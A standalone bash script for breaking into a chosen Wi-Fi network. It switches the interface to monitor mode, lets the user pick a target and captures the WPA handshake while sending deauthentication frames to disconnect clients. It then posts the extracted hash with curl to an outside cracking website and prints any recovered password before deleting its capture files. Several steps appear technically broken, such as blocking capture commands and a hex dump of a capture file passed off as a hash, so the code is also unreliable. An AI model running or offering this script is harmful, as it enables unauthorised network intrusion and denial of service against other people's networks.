#!/bin/bash

# Set up wireless interface in monitor mode
sudo ifconfig wlp2s0 down
sudo iwconfig wlp2s0 mode monitor
sudo ifconfig wlp2s0 up

# Scan for Wi-Fi networks
sudo iwlist wlp2s0 scan | grep "ESSID" | awk -F '"' '{print NR ")\t" $2}'

# Prompt user to select a network
read -p "Select a network to target (enter a number): " selection
network=$(sudo iwlist wlp2s0 scan | grep "ESSID" | awk -F '"' '{if (NR == '$selection') {print $2}}')

if [ -z "$network" ]; then
    echo "Invalid selection."
    exit 1
fi

# Capture handshake and extract hash
sudo airodump-ng --write capture --output-format pcap --essid "$network" wlp2s0
sudo aireplay-ng --deauth 5 -a $(sudo airodump-ng --essid "$network" wlp2s0 | grep -m 1 -o -E "([0-9A-F]{2}:){5}[0-9A-F]{2}") wlp2s0
sudo aircrack-ng -J hash capture*.cap
sudo hcxpcaptool -z hash.hccapx capture*.cap

# Extract the hash
hash=$(sudo cat hash.hccapx | xxd -ps)

# Submit the hash to CrackStation
crackstation_url="https://crackstation.net/"
crackstation_data="hash=$hash&hash_type=wpa-psk"

crackstation_result=$(curl -s -d "$crackstation_data" "$crackstation_url")

# Extract the password from the CrackStation result
password=$(echo "$crackstation_result" | grep -oP '<em class="password">.*?</em>' | sed -e 's/<em class="password">//g' -e 's/<\/em>//g')

# Display the password, if found
if [ -z "$password" ]; then
    echo "Password not found."
else
    echo "Password: $password"
fi

# Clean up
sudo rm capture*.cap
sudo rm hash.hccapx

# Set wireless interface back to managed mode
sudo ifconfig wlp2s0 down
sudo iwconfig wlp2s0 mode managed
sudo ifconfig wlp2s0 up
